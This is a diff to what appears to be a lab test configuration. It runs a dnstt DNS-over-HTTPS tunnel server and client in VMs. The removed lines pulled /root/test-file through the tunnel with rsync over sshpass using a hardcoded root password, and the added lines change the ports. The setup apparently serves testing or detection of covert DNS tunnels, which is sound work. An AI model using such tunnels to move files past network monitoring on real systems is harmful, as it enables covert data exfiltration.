@@ -10,7 +10,7 @@ dns_attack_server:
     run:
         type: shell
         val: >-
-          nohup asciinema rec /tmp/dnstt_server.cast -c \'set -x; /home/vagrant/dnstt/dnstt-server/dnstt-server -udp :53 -privkey {{ variables.privkey }} example.attack 127.0.0.1:22 & sleep 1\'
+          nohup asciinema rec /tmp/dnstt_server.cast -c \'set -x; /home/vagrant/dnstt/dnstt-server/dnstt-server -udp :53 -privkey {{ variables.privkey }} example.attack 127.0.0.1:1337 & sleep 1\'
 
     artifacts_to_collect:
       - type: files
@@ -29,8 +29,7 @@ dns_attack_client:
         type: shell
         val: >-
           set -x;
-          /home/vagrant/dnstt/dnstt-client/dnstt-client -doh https://192.168.0.10/dns-query -utls {{ variables.utls }} -pubkey {{ variables.pubkey }} example.attack 127.0.0.1:7000 & sleep 1;
-          rsync -P --rsh="sshpass -p root ssh -l root -oStrictHostKeyChecking=no -p 7000" 127.0.0.1:/root/test-file /tmp/;
+          nohup /home/vagrant/dnstt/dnstt-client/dnstt-client -doh https://192.168.0.10/dns-query -utls {{ variables.utls }} -pubkey {{ variables.pubkey }} example.attack 127.0.0.1:1337 & sleep 1;
 
     artifacts_to_collect:
       - type: files
